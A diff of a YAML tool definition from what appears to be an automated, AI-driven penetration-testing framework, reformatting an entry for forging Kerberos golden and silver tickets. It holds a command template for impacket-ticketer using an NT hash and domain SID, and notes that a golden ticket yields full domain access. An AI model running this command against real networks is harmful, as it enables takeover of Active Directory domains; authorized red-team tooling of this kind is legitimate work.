@@ -2,15 +2,18 @@ name: ticketer
 category: ad
 description: Forge golden/silver tickets
 preconditions:
-  - domain_joined
+- domain_joined
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "impacket-ticketer -nthash '{nt_hash}' -domain-sid '{domain_sid}' -domain {domain} '{target_user}'"
+command_template: impacket-ticketer -nthash '{nt_hash}' -domain-sid '{domain_sid}'
+  -domain {domain} '{target_user}'
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Golden ticket: forged TGT using krbtgt hash — full domain access. Silver ticket: forged TGS using service hash — access to specific service."
+mechanism: 'Golden ticket: forged TGT using krbtgt hash — full domain access. Silver
+  ticket: forged TGS using service hash — access to specific service.'
+hacktricks_ref: windows-hardening/active-directory-methodology/sid-history-injection.md
